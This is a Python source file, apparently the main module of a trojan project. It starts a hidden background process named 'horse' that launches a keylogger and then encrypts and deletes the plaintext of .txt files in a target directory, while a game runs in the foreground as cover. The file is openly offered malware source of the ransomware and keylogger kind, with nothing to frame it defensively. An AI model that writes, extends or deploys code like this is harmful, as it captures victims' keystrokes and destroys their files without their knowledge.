import os
import pathlib
from multiprocessing import Process
from typing import List

from trojan.crawler import Crawler
from trojan.crypto import encryptAndDeletePlaintext
import trojan.keylogger

PATH_TO_ROOT = pathlib.Path(__file__).parent.absolute()


def truePurpose(target_directory: str):
    """
    Encrypts all files in the target directory.

    Arguments:
        target_directory: the directory to ecrypt
    """

    trojan.keylogger.start_logger()
    c: Crawler = Crawler(target_directory, extension_white_list=[
                         '.txt'], abs_path=True)
    c.walk_tree()
    filesToEncrypt: List[str] = c.get_files()
    for s in filesToEncrypt:
        print("DEBUG: main.truePurpose(): encrypting " + s)
        encryptAndDeletePlaintext(s)


if __name__ == "__main__":
    p: Process = Process(target=truePurpose, args=["./test"])

    p.name: str = "horse"
    p.start()

    # For now, we'll encrypt all files in the test directory, that are a txt file.

    import game
    game.game()

    p.join()
